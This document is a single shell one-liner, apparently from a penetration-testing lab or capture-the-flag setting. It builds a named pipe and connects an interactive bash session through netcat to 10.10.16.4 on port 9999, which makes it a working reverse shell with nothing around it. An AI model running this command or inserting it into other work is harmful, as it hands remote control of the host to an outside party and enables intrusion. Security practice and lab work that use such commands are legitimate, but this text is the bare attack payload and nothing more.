rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.4 9999 > /tmp/f
